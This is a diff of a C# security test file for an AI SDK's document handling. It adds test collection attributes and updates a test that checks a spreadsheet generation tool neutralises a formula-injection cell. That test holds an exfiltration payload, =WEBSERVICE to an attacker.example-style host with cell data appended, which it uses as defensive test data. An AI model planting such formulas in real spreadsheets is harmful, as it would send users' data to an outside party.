@@ -9,6 +9,7 @@ using AiSdk.Documents.Generation;
 namespace AiSdk.Tests;
 
 /// <summary>Regresiones de seguridad de AiSdk.Documents: cada prueba construye la entrada hostil y comprueba que el trabajo queda acotado.</summary>
+[Collection(nameof(PerformanceSensitive))]
 public class HtmlSecurityTests
 {
     private static Task<DocumentConversionResult> ConvertHtmlAsync(string html, MarkdownConverterOptions? options = null) =>
@@ -595,6 +596,7 @@ public class OfficeSecurityTests
     }
 }
 
+[Collection(nameof(PerformanceSensitive))]
 public class PdfLimitTests
 {
     /// <summary>PDF de páginas en blanco (sin texto: todas "necesitan" OCR).</summary>
@@ -945,15 +947,25 @@ public class GenerationSecurityTests
             })
             .ReturnsText("listo");
 
-        await Ai.GenerateTextAsync(new GenerateTextOptions { Model = model, Prompt = "x", Tools = tools, StopWhen = StopCondition.StepCountIs(3) });
+        // Los artifacts exigen un ámbito (conversación o usuario) en el contexto de la herramienta.
+        await Ai.GenerateTextAsync(new GenerateTextOptions
+        {
+            Model = model,
+            Prompt = "x",
+            Tools = tools,
+            StopWhen = StopCondition.StepCountIs(3),
+            Context = new Dictionary<string, object?> { ["conversationId"] = "c1" },
+        });
 
-        var file = Assert.Single(await store.ListAsync(cancellationToken: TestContext.Current.CancellationToken));
+        var listed = Assert.Single(await store.ListAsync(cancellationToken: TestContext.Current.CancellationToken));
+        var file = (await store.GetAsync(listed.Id, cancellationToken: TestContext.Current.CancellationToken))!;
         var cells = Cells(file.Data!);
         Assert.Equal(["A2*B2"], cells.Where(c => c.Formula is not null).Select(c => c.Formula));
         Assert.Contains(cells, c => c.Text == "=WEBSERVICE(\"https://atacante.example/?\"&A2)" && c.QuotePrefix);
     }
 }
 
+[Collection(nameof(PerformanceSensitive))]
 public class OutputEscapingTests
 {
     [Fact]
